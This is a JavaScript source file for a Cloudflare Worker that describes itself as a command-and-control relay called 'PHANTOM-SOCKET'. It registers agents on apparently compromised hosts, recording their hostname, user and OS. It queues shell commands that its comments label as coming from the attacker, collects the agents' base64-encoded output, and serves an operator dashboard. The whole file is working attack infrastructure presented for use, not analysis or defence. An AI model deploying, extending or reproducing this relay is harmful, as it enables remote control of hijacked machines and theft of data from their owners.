/**
 * PHANTOM-SOCKET V3.1 — CLOUDFLARE WORKER BRAIN
 * GHOST PROTOCOL SIGNALING & C2 RELAY
 * 
 * Version: v3.1-ghost-cf
 * Principal Systems Engineer: "The cloud is our backbone. Invisible, persistent, and distributed."
 */

const AUTH_KEY = "PREDATOR-X-2026-KINETIC-PRODUCTION";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const method = request.method;

    // CORS Headers for Dashboard
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, X-Auth, X-Ghost-Agent, X-Ghost-Signature",
    };

    if (method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    // Authentication for API and critical routes
    if (path.startsWith('/api/') || ['/push', '/poll', '/fetch', '/register', '/checkin', '/result'].includes(path)) {
      const auth = request.headers.get("X-Auth") || request.headers.get("X-Ghost-Signature");
      if (auth !== AUTH_KEY) {
        return new Response(JSON.stringify({ error: "UNAUTHORIZED_GHOST" }), { 
          status: 401, 
          headers: { ...corsHeaders, "Content-Type": "application/json" } 
        });
      }
    }

    try {
      switch (path) {
        case '/dashboard':
          return await handleDashboard(request, env);
        case '/health':
          return new Response(JSON.stringify({ status: "ok", version: "v3.1-ghost-cf" }), {
            headers: { ...corsHeaders, "Content-Type": "application/json" }
          });
        
        // V3.1 Legacy Endpoints (Mapped to New Logic)
        case '/poll':
        case '/checkin':
          return await handleCheckin(request, env);
        case '/push':
        case '/api/cmd':
          return await handlePush(request, env);
        case '/result':
          return await handleResult(request, env);
        case '/fetch':
        case '/api/agents':
          return await handleFetch(request, env);
        
        // API specific for dashboard
        case (path.match(/^\/api\/cmd\//) || {}).input:
          return await handleGetResult(request, env);
          
        case '/':
          return new Response("GHOST_RELAY_ACTIVE", { status: 200, headers: corsHeaders });
        
        default:
          return new Response("NOT_FOUND", { status: 404, headers: corsHeaders });
      }
    } catch (err) {
      return new Response(JSON.stringify({ error: err.message }), { 
        status: 500, 
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      });
    }
  }
};

/**
 * SERVE DASHBOARD
 */
async function handleDashboard(request, env) {
  // In a real worker, we would use env.ASSETS or KV to serve the HTML
  // For this implementation, we assume the dashboard.html content is available
  // or served via a redirect/fetch to a static hosting.
  // Here we'll return a placeholder if not found in KV.
  const html = await env.GHOST_KV.get("assets:dashboard.html");
  if (html) {
    return new Response(html, { headers: { "Content-Type": "text/html" } });
  }
  return new Response("Dashboard asset not found in KV. Use 'wrangler kv:key put --binding GHOST_KV assets:dashboard.html ...'", { status: 404 });
}

/**
 * AGENT CHECK-IN
 */
async function handleCheckin(request, env) {
  const body = await request.json();
  const agent_id = body.id || request.headers.get("X-Ghost-Agent");
  if (!agent_id) throw new Error("MISSING_AGENT_ID");

  const agent_info = {
    hostname: body.hostname || "unknown",
    user: body.user || "unknown",
    os: body.os || "linux",
    php_ver: body.php_version || "n/a",
    last_seen: Date.now()
  };
  
  await env.GHOST_KV.put(`agent:${agent_id}`, JSON.stringify(agent_info), { expirationTtl: 86400 });

  // Get pending commands
  const queue_key = `queue:${agent_id}`;
  const commands_raw = await env.GHOST_KV.get(queue_key);
  const commands = commands_raw ? JSON.parse(commands_raw) : [];
  
  // Clear queue after polling
  if (commands.length > 0) {
    await env.GHOST_KV.delete(queue_key);
  }

  return new Response(JSON.stringify({ status: "OK", commands: commands }), {
    headers: { "Content-Type": "application/json" }
  });
}

/**
 * PUSH COMMAND (FROM ATTACKER)
 */
async function handlePush(request, env) {
  const body = await request.json();
  const agent_id = body.agent_id;
  if (!agent_id) throw new Error("MISSING_TARGET_AGENT");

  const task_id = crypto.randomUUID();
  const cmd_payload = {
    id: task_id,
    payload: body.command === 'exec' ? body.args.cmd : body.command,
    args: body.args,
    timestamp: Date.now()
  };

  // Append to queue
  const queue_key = `queue:${agent_id}`;
  const existing_queue_raw = await env.GHOST_KV.get(queue_key);
  const queue = existing_queue_raw ? JSON.parse(existing_queue_raw) : [];
  queue.push(cmd_payload);
  
  await env.GHOST_KV.put(queue_key, JSON.stringify(queue), { expirationTtl: 3600 });

  return new Response(JSON.stringify({ status: "QUEUED", task_id: task_id }), {
    headers: { "Content-Type": "application/json" }
  });
}

/**
 * SUBMIT RESULT (FROM AGENT)
 */
async function handleResult(request, env) {
  const body = await request.json();
  const task_id = body.command_id;
  const output = body.output; // Base64 encoded from agent

  await env.GHOST_KV.put(`result:${task_id}`, output, { expirationTtl: 3600 });
  return new Response(JSON.stringify({ status: "RECEIVED" }), {
    headers: { "Content-Type": "application/json" }
  });
}

/**
 * FETCH AGENTS OR RESULT
 */
async function handleFetch(request, env) {
  const url = new URL(request.url);
  const agent_id = url.searchParams.get("agent_id");

  if (!agent_id || agent_id === 'all') {
    const list = await env.GHOST_KV.list({ prefix: "agent:" });
    const agents = [];
    for (const key of list.keys) {
      const info = await env.GHOST_KV.get(key.name);
      agents.push({ id: key.name.split(':')[1], info: JSON.parse(info) });
    }
    return new Response(JSON.stringify(agents), {
      headers: { "Content-Type": "application/json" }
    });
  }
  
  throw new Error("INVALID_FETCH");
}

/**
 * GET SPECIFIC COMMAND RESULT
 */
async function handleGetResult(request, env) {
  const url = new URL(request.url);
  const task_id = url.pathname.split('/').pop();
  
  const result_b64 = await env.GHOST_KV.get(`result:${task_id}`);
  if (result_b64) {
    // Decode if it's base64 (agents send output as b64)
    try {
        const decoded = atob(result_b64);
        return new Response(JSON.stringify({ output: decoded }), {
            headers: { "Content-Type": "application/json" }
        });
    } catch (e) {
        return new Response(JSON.stringify({ output: result_b64 }), {
            headers: { "Content-Type": "application/json" }
        });
    }
  }
  
  return new Response(JSON.stringify({ status: "PENDING" }), {
    headers: { "Content-Type": "application/json" }
  });
}
